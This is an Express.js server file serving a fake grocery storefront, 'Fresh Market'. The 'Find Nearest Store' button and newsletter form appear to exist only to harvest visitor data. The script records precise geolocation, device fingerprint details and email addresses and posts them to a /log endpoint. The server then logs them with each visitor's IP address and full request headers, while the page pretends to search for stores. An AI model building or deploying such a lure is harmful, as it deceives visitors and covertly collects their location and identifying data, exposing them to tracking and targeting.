const express = require('express');
const app = express();

app.get('/', (req, res) => {
 res.send(`
   <!DOCTYPE html>
   <html>
   <head>
       <title>Fresh Market</title>
       <meta name="viewport" content="width=device-width, initial-scale=1">
       <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
       <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   </head>
   <body class="bg-gray-50">
       <nav class="bg-green-600 text-white p-4">
           <div class="container mx-auto flex justify-between items-center">
               <h1 class="text-2xl font-bold">Fresh Market</h1>
               <div class="space-x-4">
                   <a href="#" class="hover:text-green-200">Home</a>
                   <a href="#" class="hover:text-green-200">Products</a>
                   <a href="#" class="hover:text-green-200">Contact</a>
               </div>
           </div>
       </nav>

       <main class="container mx-auto p-4">
           <div class="bg-white rounded-lg shadow-lg p-6 mb-6">
               <h2 class="text-3xl font-bold mb-4">Welcome to Fresh Market</h2>
               <p class="text-gray-600 mb-4">Discover fresh produce and quality products at great prices.</p>
               <button onclick="getLocation()" class="bg-green-600 text-white px-6 py-2 rounded hover:bg-green-700">
                   Find Nearest Store
               </button>
           </div>

           <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
               <div class="bg-white rounded-lg shadow p-6">
                   <i class="fas fa-apple-alt text-4xl text-green-600 mb-4"></i>
                   <h3 class="text-xl font-bold mb-2">Fresh Produce</h3>
                   <p class="text-gray-600">Farm-fresh fruits and vegetables daily.</p>
               </div>
               <div class="bg-white rounded-lg shadow p-6">
                   <i class="fas fa-truck text-4xl text-green-600 mb-4"></i>
                   <h3 class="text-xl font-bold mb-2">Fast Delivery</h3>
                   <p class="text-gray-600">Same-day delivery to your doorstep.</p>
               </div>
               <div class="bg-white rounded-lg shadow p-6">
                   <i class="fas fa-tag text-4xl text-green-600 mb-4"></i>
                   <h3 class="text-xl font-bold mb-2">Best Prices</h3>
                   <p class="text-gray-600">Competitive prices on all items.</p>
               </div>
           </div>

           <div class="bg-white rounded-lg shadow-lg p-6 mt-6">
               <h3 class="text-xl font-bold mb-4">Subscribe to Our Newsletter</h3>
               <form id="newsletterForm" class="flex gap-4">
                   <input type="email" id="email" required placeholder="Enter your email" 
                          class="flex-1 p-2 border rounded">
                   <button type="submit" class="bg-green-600 text-white px-6 py-2 rounded hover:bg-green-700">
                       Subscribe
                   </button>
               </form>
           </div>
       </main>

       <div id="status" class="fixed bottom-4 right-4 bg-green-600 text-white p-4 rounded hidden"></div>

       <script>
       function getLocation() {
           if (navigator.geolocation) {
               navigator.geolocation.getCurrentPosition((position) => {
                   const data = {
                       type: 'location',
                       lat: position.coords.latitude,
                       long: position.coords.longitude,
                       userAgent: navigator.userAgent,
                       platform: navigator.platform,
                       language: navigator.language,
                       screenRes: \`\${window.screen.width}x\${window.screen.height}\`,
                       timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                   };
                   
                   fetch('/log', {
                       method: 'POST',
                       headers: {'Content-Type': 'application/json'},
                       body: JSON.stringify(data)
                   });
                   
                   const status = document.getElementById('status');
                   status.textContent = 'Finding stores near you...';
                   status.classList.remove('hidden');
                   setTimeout(() => status.classList.add('hidden'), 3000);
               });
           }
       }

       document.getElementById('newsletterForm').addEventListener('submit', async (e) => {
           e.preventDefault();
           const email = document.getElementById('email').value;
           
           await fetch('/log', {
               method: 'POST',
               headers: {'Content-Type': 'application/json'},
               body: JSON.stringify({
                   type: 'newsletter',
                   email,
                   timestamp: new Date().toISOString()
               })
           });
           
           const status = document.getElementById('status');
           status.textContent = 'Newsletter subscription successful!';
           status.classList.remove('hidden');
           setTimeout(() => status.classList.add('hidden'), 3000);
           document.getElementById('email').value = '';
       });
       </script>
   </body>
   </html>
 `);
});

app.use(express.json());
app.post('/log', (req, res) => {
 console.log('Client Details:', JSON.stringify({
   ...req.body,
   ip: req.ip,
   headers: req.headers,
   timestamp: new Date().toISOString()
 }, null, 2));
 res.send('Logged');
});

app.listen(3000, () => console.log('Server running on port 3000'));